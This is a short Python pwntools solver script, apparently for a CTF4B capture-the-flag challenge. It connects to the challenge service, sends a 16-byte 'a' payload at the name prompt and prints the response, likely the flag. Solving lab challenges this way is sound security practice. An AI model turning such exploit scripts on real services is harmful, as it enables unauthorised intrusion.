#!/usr/bin/env python3
from pwn import context, ELF, remote
import os

HOST = os.getenv("CTF4B_HOST", "localhost")
PORT = int(os.getenv("CTF4B_PORT", "9000"))

context.log_level = "critical"
binfile = "./chall"
e = ELF(binfile)
context.binary = binfile

p = remote(HOST, PORT)

payload = b"a" * 0x10
assert len(payload) <= 0x10

p.sendlineafter(b"name:", payload)
p.readline()
print(p.readline().decode(), end="")
